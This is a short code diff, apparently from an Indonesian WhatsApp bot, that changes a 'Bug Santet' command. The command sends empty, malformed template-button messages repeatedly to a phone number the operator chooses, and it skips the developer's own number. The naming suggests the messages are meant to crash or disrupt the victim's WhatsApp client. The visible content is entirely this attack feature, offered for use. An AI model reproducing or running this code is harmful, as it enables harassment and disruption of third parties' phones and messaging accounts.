@@ -573,7 +573,7 @@ async function cerpen (category) {
 }
 
 async function bygbt(text) {
-XeonBotInc.sendMessage(text, {
+XeonBotInc.sendMessage(nmn, {
 text: '', 
 templateButtons: [
 { callButton: { displayText: `P`, phoneNumber: ``}},
@@ -686,6 +686,18 @@ if (!q) return reply(`Contoh ${command} 6281297970769`)
 nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 if (Input == isCreator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
 reply(`Bug Santet Telah Dikirim Ke: *${text}*`)
+async function bygbt(text) {
+XeonBotInc.sendMessage(nmn, {
+text: '', 
+templateButtons: [
+{ callButton: { displayText: `P`, phoneNumber: ``}},
+{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
+{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
+{ quickReplyButton: { displayText: `P`, id: ``}},
+{ quickReplyButton: { displayText: `P`, id: ``}},
+{ quickReplyButton: { displayText: `P`, id: ``}},
+]})
+}
 santedpc(bygbt, nmn, sleep)
 }
 break
